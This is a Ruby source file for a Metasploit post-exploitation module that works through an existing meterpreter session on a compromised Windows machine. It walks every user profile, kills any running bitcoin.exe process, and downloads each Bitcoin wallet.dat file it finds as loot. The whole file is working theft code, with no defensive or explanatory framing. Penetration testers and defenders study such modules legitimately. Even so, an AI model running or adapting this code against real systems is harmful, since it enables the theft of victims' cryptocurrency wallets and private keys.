# $Id$

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'


class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather Bitcoin wallet.dat',
				'Description'   => %q{ This module downloads any Bitcoin wallet.dat files from the target system},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'illwill <illwill[at]illmob.org>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking All Users For Bitcoin Wallet...")
		os = session.sys.config.sysinfo['OS']
		drive = session.fs.file.expand_path("%SystemDrive%")

		if os =~ /Windows 7|Vista|2008/
			@appdata = '\\AppData\\Roaming\\'
			@users = drive + '\\Users'
		else
			@appdata = '\\Application Data\\'
			@users = drive + '\\Documents and Settings'
		end

		get_users
		
		@userpaths.each do |path|
			jack_wallet(path)
		end
	end

	def jack_wallet(path)
		data     = ""
		filename = "#{path}#{@appdata}\\Bitcoin\\wallet.dat"
		found    = client.fs.file.stat(filename) rescue nil
		return if not found
		
		print_status("Wallet Found At #{filename}")
		print_status("     Jackin their wallet...")
			
		kill_bitcoin
		
		begin
			wallet = session.fs.file.new(filename, "rb")
			until wallet.eof?
				data << wallet.read
 			end
			
			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
			print_status("     Wallet Jacked.")
		rescue ::Interrupt 
			raise $!
		rescue ::Exception => e
			print_error("Failed to download #{filename}: #{e.class} #{e}")	
		end
	end

	def get_users
		@userpaths = []
		session.fs.dir.foreach(@users) do |path|
			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			@userpaths << "#{@users}\\#{path}\\"
		end
	end
	
		
	def kill_bitcoin
		client.sys.process.get_processes().each do |x|
			if x['name'].downcase == "bitcoin.exe"
				print_status("     #{x['name']} Process Found...")
				print_status("     Killing Process ID #{x['pid']}...")
				session.sys.process.kill(x['pid']) rescue nil
			end
		end
	end

end
